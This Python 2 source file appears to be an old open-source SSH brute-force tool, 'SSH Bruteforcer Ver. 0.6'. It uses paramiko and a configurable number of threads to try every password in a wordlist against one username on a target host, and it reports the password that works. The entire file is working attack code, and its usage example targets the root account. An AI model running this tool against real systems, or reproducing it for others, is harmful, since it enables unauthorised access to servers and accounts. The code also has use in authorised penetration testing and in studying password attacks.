import thread
import time
from threading import Thread
import sys, os,threading, time, traceback, getopt
import paramiko
import terminal

global adx
global port

adx="1"
port=22
data=[]
i=[]

term = terminal.TerminalController()
paramiko.util.log_to_file('demo.log')

print "\n*************************************"
print "*"+term.RED + "SSH Bruteforcer Ver. 0.6"+term.NORMAL+"           *"
print "*Coded by Christian Martorella      *"
print "*Edge-Security Research             *"
print "*cmartorella@edge-security.com      *"
print "*************************************\n"

def usage():
    print "Usage: brutessh.py options \n"
    print "       -h: destination host"
    print "       -u: username to force"
    print "       -d: password file "
    print "       -t: threads (default 12, more could be bad)"
    print "       -p: target port\n"
    print "Example:  brutessh.py -h 192.168.1.55 -u root -d mypasswordlist.txt \n"
    sys.exit()

class force(Thread):
	def __init__( self, name,num ):
		Thread.__init__(self)
		self.name = name
		self.num = str(num)

	def run(self):
		global adx
		if adx == "1":
			passw=self.name.split("\n")[0]
			print term.BOL + term.UP + term.CLEAR_EOL + self.num +"/"+ str(totaldict)+" "+ passw + term.NORMAL
			t = paramiko.Transport(hostname)
			try:
				t.start_client()
			except Exception:
				x = 0

			try:
				t.auth_password(username=username,password=passw)
			except Exception:
				x = 0

			if t.is_authenticated():
				print term.DOWN + term.GREEN + "\nAuth OK ---> Password Found: " + passw + term.DOWN + term.NORMAL
				t.close()
				adx = "0"
				sys.exit()
			else:
				t.close()
		time.sleep(0)
		i[0]=i[0]-1


def test_thread(names):
	i.append(0)
	j=0
	while len(names):
		try:
			if i[0]<th:
				n = names.pop(0)
				i[0]=i[0]+1
				thread=force(n,j)
				thread.start()
				j=j+1
		except KeyboardInterrupt:
			print "Attack suspended by user..\n"
			sys.exit()
	thread.join()

def test(argv):
	global th
	global hostname
	global username
	global totaldict
	th = 12
	if len(sys.argv) < 3:
		usage()
	try :
		opts, args = getopt.getopt(argv,"h:u:d:t:p:")
	except getopt.GetoptError:
		usage()
	for opt,arg in opts :
		if opt == '-u':
			username = arg
		elif opt == '-h':
			hostname =arg
		elif opt == '-d':
			password = arg
		elif opt == "-t":
			th = arg
		elif opt == "-p":
			port= arg
	try:
		f = open(password, "r")
	except:
		print "Can't open password file\n"
		sys.exit()
	print term.RED + "HOST: " +term.NORMAL +  hostname + term.RED 
	print "Username: " +term.NORMAL +  username +term.RED 
	print "Password file: " +term.NORMAL+ password
	print "========================================================="
	print "Trying password...\n"
	name = f.readlines()
	totaldict=len(name)
	starttime = time.clock()
	test_thread(name)
	stoptime = time.clock()
	print "\nTimes -- > Init: "+ str(starttime) + " End: "+str(stoptime)
	print "\n"
	
if __name__ == "__main__":
	try:
		test(sys.argv[1:])
	except KeyboardInterrupt:
		print "Attack suspended by user...\n"
		sys.exit()
